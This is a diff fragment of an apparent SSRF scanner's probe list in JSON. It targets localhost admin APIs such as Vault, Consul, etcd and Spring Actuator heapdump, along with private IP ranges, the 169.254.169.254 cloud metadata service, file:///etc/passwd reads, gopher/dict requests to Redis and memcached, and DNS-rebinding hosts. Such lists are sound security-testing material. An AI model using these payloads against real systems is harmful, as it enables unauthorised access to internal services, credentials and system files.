+  },
+  {
+    "name": "localhost_rabbit",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:15672/api/overview",
+    "matcher": "(rabbitmq_version|management_version)"
+  },
+  {
+    "name": "localhost_consul",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:8500/v1/agent/self",
+    "matcher": "(\"Config\"|\"DebugConfig\")"
+  },
+  {
+    "name": "localhost_vault",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:8200/v1/sys/health",
+    "matcher": "(\"initialized\"|\"sealed\"|\"standby\")"
+  },
+  {
+    "name": "localhost_etcd",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:2379/v2/keys/",
+    "matcher": "(\"action\":\\s*\"get\"|errorCode)"
+  },
+  {
+    "name": "localhost_prometheus",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:9090/api/v1/status/config",
+    "matcher": "(\"status\":\\s*\"success\"|yaml)"
+  },
+  {
+    "name": "localhost_grafana",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:3000/api/health",
+    "matcher": "(\"database\"|\"version\")"
+  },
+  {
+    "name": "localhost_actuator",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:8080/actuator/env",
+    "matcher": "(\"activeProfiles\"|\"propertySources\")"
+  },
+  {
+    "name": "localhost_actuator_heapdump",
+    "category": "localhost",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "url": "http://127.0.0.1:8080/actuator/heapdump",
+    "matcher": "(JAVA PROFILE|HPROF)"
+  },
+  {
+    "name": "internal_10",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://10.0.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_10_254",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://10.0.0.254/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_172",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://172.16.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_172_31",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://172.31.255.254/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_192",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://192.168.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_192_1_1",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://192.168.1.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_ipv6_ula",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://[fc00::1]/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_ipv6_ll",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://[fe80::1]/",
+    "matcher": ".+"
+  },
+  {
+    "name": "internal_169254",
+    "category": "internal-net",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://169.254.169.254/",
+    "matcher": ".+"
+  },
+  {
+    "name": "schema_file_passwd",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "file:///etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "schema_file_windows",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "file:///C:/Windows/win.ini",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "name": "schema_gopher_redis",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "gopher://127.0.0.1:6379/_INFO",
+    "matcher": "(redis_version|\\+OK)"
+  },
+  {
+    "name": "schema_gopher_mc",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "gopher://127.0.0.1:11211/_stats",
+    "matcher": "(STAT|VERSION)"
+  },
+  {
+    "name": "schema_dict_mc",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "dict://127.0.0.1:11211/stats",
+    "matcher": "(STAT|VERSION)"
+  },
+  {
+    "name": "schema_dict_redis",
+    "category": "schema-bypass",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "dict://127.0.0.1:6379/info",
+    "matcher": "(redis_version|\\+OK)"
+  },
+  {
+    "name": "schema_ldap",
+    "category": "schema-bypass",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "ldap://127.0.0.1:389/",
+    "matcher": ".+"
+  },
+  {
+    "name": "schema_sftp",
+    "category": "schema-bypass",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "sftp://127.0.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "schema_tftp",
+    "category": "schema-bypass",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "tftp://127.0.0.1/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "schema_netdoc",
+    "category": "schema-bypass",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "netdoc:///etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "schema_jar",
+    "category": "schema-bypass",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "jar:http://127.0.0.1!/",
+    "matcher": ".+"
+  },
+  {
+    "name": "dns_rebind_imds_nip",
+    "category": "dns-rebind",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254.nip.io/latest/meta-data/",
+    "matcher": "(ami-id|instance-id)"
+  },
+  {
+    "name": "dns_rebind_imds_xip",
+    "category": "dns-rebind",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254.xip.io/latest/meta-data/",
+    "matcher": "(ami-id|instance-id)"
+  },
+  {
+    "name": "dns_rebind_localtest",
+    "category": "dns-rebind",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://localtest.me/",
+    "matcher": ".+"
+  },
+  {
+    "name": "dns_rebind_localhost_nip",
+    "category": "dns-rebind",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1.nip.io/",
+    "matcher": ".+"
+  },
+  {
+    "name": "dns_rebind_sslip",
+    "category": "dns-rebind",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254.sslip.io/latest/meta-data/",
+    "matcher": "(ami-id|instance-id)"
+  },
+  {
+    "name": "dns_rebind_burp",
+    "category": "dns-rebind",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://spoofed.burpcollaborator.net/",
+    "matcher": ".+"
+  }
 ]
